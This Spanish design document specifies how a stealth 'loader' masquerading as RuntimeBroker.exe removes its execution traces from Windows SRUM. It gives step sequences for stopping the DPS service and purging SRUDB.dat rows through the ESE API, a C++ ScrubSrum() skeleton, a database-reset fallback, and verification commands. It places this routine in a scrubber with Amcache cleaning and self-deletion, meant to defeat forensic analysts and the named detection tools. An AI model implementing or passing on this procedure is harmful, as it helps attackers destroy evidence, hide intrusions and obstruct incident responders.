# docs/SRUM.md — Procedimiento de saneamiento de SRUM (SRUDB.dat)

Estado: **gap conocido y documentado**. No implementado en `ForensicScrub.h`.
Candidato a `ScrubSrum()` opcional bajo flag `--srum`.

---

## 1. Objeto

Describir cómo se elimina el rastro de ejecución que deja el loader en **SRUM**
(System Resource Usage Monitor) y por qué el orden, el método y las salvaguardas
importan más aquí que en cualquier otro artefacto del scrub.

## 2. Qué es SRUM

SRUM es el monitor de uso de recursos de Windows. Lo aloja el servicio **DPS**
(Diagnostic Policy Service, `svchost.exe -k DcomLaunch -p`) y persiste en una base
de datos **ESE / Jet Blue**:

- `%SystemRoot%\System32\sru\SRUDB.dat` — la base de datos
- `%SystemRoot%\System32\sru\SRUDB.jfm` — fichero de shadow de ESE
- Extensiones de recolección en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SRUM\Extensions`

Retención por tabla (valores por defecto): `AppResourceUsage` 30 días,
`NetworkUsages` 60 días, resto 30. Los timestamps son **FILETIME** (UTC).

## 3. Por qué importa aquí — y por qué quizá no

**A favor de tratarlo:** SRUM guarda el **path completo** del ejecutable como
string UTF-16 en `SruDbIdMapTable.IdBlob` (IdType 0). El path sobrevive al borrado
del fichero, así que un analista ve `C:\...\RuntimeBroker.exe` apuntando a un
fichero inexistente. Eso canta. Echo y Paladin parsean SRUM entre sus fuentes.

**En contra (y es importante):** el loader vive **milisegundos**. SRUM no es un
log de ejecución síncrono:

- `AppResourceUsage` se agrega por temporizador (del orden de minutos), no por
  arranque de proceso — una ejecución de <1 s **con alta probabilidad no genera
  fila alguna**.
- `NetworkUsages` se escribe al cerrar una conexión — el loader no abre red, así
  que tampoco.
- `AppTimeline` solo cubre apps con seguimiento de primer plano.

**Conclusión operativa:** para este loader concreto, el riesgo real de aparecer en
SRUM es **bajo**. SRUM no debe estar en el camino crítico del scrub (es lento e
invasivo: exige parar DPS). Va como paso opcional y best-effort. Lo que **sí** hay
que hacer es no empeorarlo: no dejar el `.exe` en rutas absurdas.

## 4. Modelo de datos relevante

Solo interesan las tablas con FK a `SruDbIdMapTable`. Borrar la fila de identidad
sin borrar sus filas de uso deja **filas huérfanas** (los visores muestran
`AppId` sin resolver o directamente fallan).

Puntos clave:

- La identidad a borrar es la fila de `SruDbIdMapTable` cuyo `IdBlob` (UTF-16LE)
  coincide con el basename del ejecutable, **case-insensitive**.
- `UserId` es otra fila de la misma tabla (IdType 1, un SID). **No** se borra: la
  comparten miles de apps.
- `IdType`: `0` = ruta de aplicación, `1` = SID de usuario, `2` = paquete AppX.

## 5. Estrategias

| # | Método | Invasividad | Conserva timestamps | Riesgo | Recomendado |
|---|--------|-------------|--------------------|--------|-------------|
| A | Purga de filas vía API ESE | Media (para DPS ~1-2 s) | Sí | Corrupción si se aborta a mitad | **Sí, con flag** |
| B | Borrar `SRUDB.dat` + `.jfm` + reiniciar DPS | Baja | **No** (creación = ahora) | Bajo, pero reset visible | Fallback |
| C | Edición offline en WinPE con `libesedb`/`dissect.esedb` | Nula | Sí | Solo lectura en esas libs | Solo forense |
| D | `esentutl /p` o `/d` | Baja | Sí | **No borra filas** | Complemento |

`esentutl` **no** sabe borrar registros: solo repara y compacta. Para purga real
hace falta la API ESE (`esent.dll`) o una herramienta que la envuelva.

## 6. Procedimiento A — purga por filas (implementación de referencia)

### 6.1 Salvaguardas obligatorias

1. **Solo si DPS está `RUNNING`.** Si está parado o deshabilitado, SRUM no se está
   escribiendo: no hay nada que limpiar y arrancarlo introduce ruido.
2. **Copiar `SRUDB.dat` antes de tocar nada** a `%TEMP%\srum_bak.dat`. Si el
   commit falla, restaurar.
3. **Transacción única** (`JetBeginTransaction` ... `JetCommitTransaction`). Si algo
   falla, `JetRollback` y salir sin dejar estado intermedio.
4. **Nunca borrar la fila de identidad sin haber borrado antes todas sus filas de
   uso** (orden inverso al de la FK).
5. **Restaurar DPS siempre**, en todas las rutas de salida, incluida la de error.
6. Rechazar la operación si el proceso no es elevado (DPS no se puede controlar sin
   admin).

### 6.2 Secuencia

```
1. OpenSCManager / OpenService("DPS") / ControlService(STOP)
   Esperar SERVICE_STOPPED (timeout 5 s). Si no para: abortar sin tocar el fichero.
2. CopyFile(SRUDB.dat -> %TEMP%\srum_bak.dat)
3. JetCreateInstance("SrumScrub")
   JetSetSystemParameter(JET_paramTempPath, %TEMP%)
   JetSetSystemParameter(JET_paramCircularLog, 1)
   JetInit
4. JetBeginSession -> sesid
5. JetAttachDatabase(sesid, path, JET_bitDbExclusive)
   JetOpenDatabase(sesid, path, nullptr, JET_bitDbExclusive, &dbid)
6. JetBeginTransaction(sesid)
7. FASE LECTURA — resolver la identidad:
   JetOpenTable(sesid, dbid, "SruDbIdMapTable", ...)
   JetSetCurrentIndex(sesid, tableid, "IdIndex")
   Bucle: JetRetrieveColumn(JET_coltypLong, IdIndex)
          + JetRetrieveColumn(JET_coltypLongText, IdBlob)
          IdBlob -> UTF-16LE -> ToLower -> comparar basename
          Si coincide y IdType == 0 -> recordar IdIndex y bookmark
   JetCloseTable
8. FASE BORRADO — por cada tabla de uso y cada IdIndex recordado:
   JetSetCurrentIndex(sesid, tableid, "AppId")
   JetMakeKey(sesid, tableid, &idindex, sizeof(DWORD), JET_bitKeyDataZeroLength)
   JetSeek / JetMove hasta agotar coincidencias
   JetDelete(sesid, tableid)
   Tablas, en este orden:
     AppResourceUsage, NetworkUsages, NetworkConnectivity, EnergyUsages, AppTimeline
9. Borrar la fila de SruDbIdMapTable por su bookmark (JetGotoBookmark + JetDelete)
10. JetCommitTransaction(sesid, 0)
11. JetCloseDatabase / JetDetachDatabase / JetEndSession / JetTerm
12. StartService("DPS") -> esperar SERVICE_RUNNING (timeout 10 s)
13. En fallo de (10): rollback, JetTerm, restaurar srum_bak.dat, arrancar DPS.
```

### 6.3 Esqueleto C++ (esent.dll, enlace dinámico)

```cpp
// ScrubSrum() -- best-effort, solo con --srum. Devuelve false y deja DPS como estaba.
inline bool ScrubSrum() {
    // 1. Privilegios y elevación
    EnablePrivilege(SE_DEBUG_NAME);

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceW(scm, L"DPS",
        SERVICE_STOP | SERVICE_START | SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return false; }

    SERVICE_STATUS st{};
    ControlService(svc, SERVICE_CONTROL_STOP, &st);
    // Esperar STOPPED con QueryServiceStatus, timeout 5 s

    auto restart_dps = [&]() {
        StartServiceW(svc, 0, nullptr);
        // Esperar SERVICE_RUNNING con QueryServiceStatusEx, timeout 10 s
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
    };

    // 2. Backup
    wchar_t sysroot[MAX_PATH]{};
    GetEnvironmentVariableW(L"SystemRoot", sysroot, MAX_PATH);
    std::wstring db  = std::wstring(sysroot) + L"\\System32\\sru\\SRUDB.dat";
    std::wstring jfm = std::wstring(sysroot) + L"\\System32\\sru\\SRUDB.jfm";
    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    std::wstring bak     = std::wstring(temp) + L"srum_bak.dat";
    std::wstring bak_jfm = std::wstring(temp) + L"srum_bak.jfm";
    CopyFileW(db.c_str(),  bak.c_str(),     FALSE);
    CopyFileW(jfm.c_str(), bak_jfm.c_str(), FALSE);

    // 3. Carga dinámica de esent.dll (sin dependencia estática)
    HMODULE hEse = LoadLibraryW(L"esent.dll");
    if (!hEse) { restart_dps(); return false; }

    // Resolver punteros de función via GetProcAddress:
    // JetCreateInstance2W, JetSetSystemParameterW, JetInit,
    // JetBeginSession, JetAttachDatabaseW, JetOpenDatabaseW,
    // JetBeginTransaction, JetOpenTableW, JetSetCurrentIndexW,
    // JetRetrieveColumn, JetMove, JetDelete, JetGotoBookmark,
    // JetCommitTransaction, JetRollback, JetCloseTable,
    // JetCloseDatabase, JetDetachDatabaseW, JetEndSession, JetTerm
    // ... (FILL: GetProcAddress para cada una)

    bool ok = false;
    // 4-10: sesion -> attach -> transaction -> leer identidad
    //        -> borrar filas de uso -> borrar identidad -> commit
    // En cualquier fallo: JetRollback -> JetTerm
    //   -> CopyFileW(bak, db, FALSE) + CopyFileW(bak_jfm, jfm, FALSE)

    // 11-12
    // JetCloseDatabase / JetDetachDatabase / JetEndSession / JetTerm
    FreeLibrary(hEse);

    if (!ok) {
        // Restaurar backup si el commit falló
        CopyFileW(bak.c_str(),     db.c_str(),  FALSE);
        CopyFileW(bak_jfm.c_str(), jfm.c_str(), FALSE);
    }

    restart_dps();
    DeleteFileW(bak.c_str());
    DeleteFileW(bak_jfm.c_str());
    return ok;
}
```

### 6.4 Trampas conocidas

- **`JET_bitDbExclusive` falla con `JET_errDatabaseInUse`** si DPS sigue vivo,
  aunque esté en `STOP_PENDING`. Esperar de verdad al estado `STOPPED`.
- **`JET_coltypLongText` para `IdBlob` es UTF-16LE**, no UTF-8. Comparar en wide.
- **`SRUDB.jfm`** debe quedar consistente: si se restaura el `.dat` del backup hay
  que restaurar también el `.jfm` del mismo instante, o borrarlo y dejar que ESE
  reconstruya.
- **ESE no tolera `JetTerm` sin `JetEndSession`** previo; el servicio luego
  recrea la base y aparece el artefacto de reset.
- Algunos builds no exponen índice sobre `AppId` en todas las tablas: fallback a
  recorrido secuencial con `JetMove(JET_MoveNext)` y comparación de columna.

## 7. Procedimiento B — reset del fichero (fallback)

```
1. Parar DPS (misma salvaguarda que 6.2.1)
2. Renombrar SRUDB.dat  -> SRUDB.dat.old
   Renombrar SRUDB.jfm  -> SRUDB.jfm.old
3. Arrancar DPS -> recrea base vacía
4. Borrar los .old
```

**Artefacto:** el `CreationTime` de `SRUDB.dat` pasa a ser el momento del scrub.
SRUM se resetea solo en algunas actualizaciones de Windows, así que es una señal
débil, pero es una señal. Solo usar si A falla.

## 8. Verificación

```cmd
:: Volcado (Windows Performance Toolkit)
srumutil.exe /v > %TEMP%\srum.txt & findstr /i "runtimebroker" %TEMP%\srum.txt

:: O con SrumECmd (Zimmerman), sobre copia del fichero
SrumECmd.exe -f C:\Windows\System32\sru\SRUDB.dat --csv %TEMP%\srum
```

Criterio de éxito: **cero** coincidencias del basename del loader en `IdBlob` y
cero filas huérfanas apuntando a su `IdIndex`.

## 9. Artefactos que introduce el propio scrub

| Artefacto | Origen | Mitigación |
|-----------|--------|------------|
| Parada/arranque de DPS | `ControlService` | Evento 7036 en System; inevitable |
| `%TEMP%\srum_bak.dat` | Backup | Borrar al terminar |
| `CreationTime` de SRUDB.dat | Solo método B | Preferir método A |
| Reescritura de páginas ESE | Cualquier commit | Ninguna; inherente |

## 10. Integración propuesta

- Firma: `bool ScrubSrum()` en `ForensicScrub.h`, namespace `bp`.
- Flag: `--srum`. **No** en el camino por defecto (añade 1-2 s y para un servicio
  del sistema; en un loader que debe morir en milisegundos eso se nota).
- Orden en `ScrubberMain`: **después** de Amcache y **antes** de `SelfDelete()`.
- Log: `log_step(L"SRUM", ok)`.
- Si DPS no está `RUNNING` al entrar: `log_step(L"SRUM", false)` y salir sin
  arrancarlo.

## 11. Checklist de aceptación

- [ ] DPS `STOPPED` confirmado antes de abrir la base
- [ ] Backup creado y verificado (`GetFileSize > 0`)
- [ ] Transacción única, rollback en toda ruta de error
- [ ] Filas de uso borradas antes que la de identidad
- [ ] `IdType == 0` comprobado (no borrar SIDs)
- [ ] DPS `RUNNING` restaurado en éxito **y** en error
- [ ] Backup eliminado
- [ ] Verificación del punto 8 sin coincidencias

## 12. Decisión previa recomendada — medir antes de implementar

Antes de invertir en las ~300 líneas de ESE, verificar si el loader genera
alguna fila en SRUM:

```powershell
# Ejecutar el loader, esperar 5 minutos, luego:
SrumECmd.exe -f C:\Windows\System32\sru\SRUDB.dat --csv $env:TEMP\srum_check
Select-String -Path "$env:TEMP\srum_check\*.csv" -Pattern "runtimebroker" -CaseSensitive:$false
```

Si el resultado es vacío en diez intentos: **SRUM se documenta como gap
irrelevante para este loader** y `ScrubSrum()` queda como código muerto opcional.
Esa posición es más defendible en una review que implementar infraestructura ESE
para un artefacto que nunca aparece.
